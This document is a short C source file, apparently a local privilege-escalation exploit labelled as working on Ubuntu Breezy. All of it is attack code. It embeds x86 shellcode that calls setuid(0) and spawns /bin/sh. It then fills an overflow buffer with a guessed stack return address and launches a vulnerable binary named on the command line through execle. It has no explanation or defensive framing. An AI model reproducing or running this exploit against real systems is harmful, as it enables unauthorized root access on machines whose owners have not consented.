* Successful Exploit in Ubuntu Breezey */
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define BUFSIZE 225
#define ALIGNMENT 1
int main(int argc, char **argv )
{
        char shellcode[]=
                "\x6a\x17\x58\x31\xdb\xcd\x80"
                "\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80";

        if(argc < 2)
                 {
           fprintf(stderr, "Use : %s <path_to_vuln>\n", argv[0]);
             return 0;
             }
        char *env[] = {shellcode, NULL};
        char buf[BUFSIZE];
                int i;
                int *ap = (int *)(buf + ALIGNMENT);
                int ret = 0xbffffffa - strlen(shellcode) - strlen(argv[1]);

                for (i = 0; i < BUFSIZE - 4; i += 4)
                *ap++ = ret;
                execle(argv[1], "/dev/midi1", buf, NULL, env);

}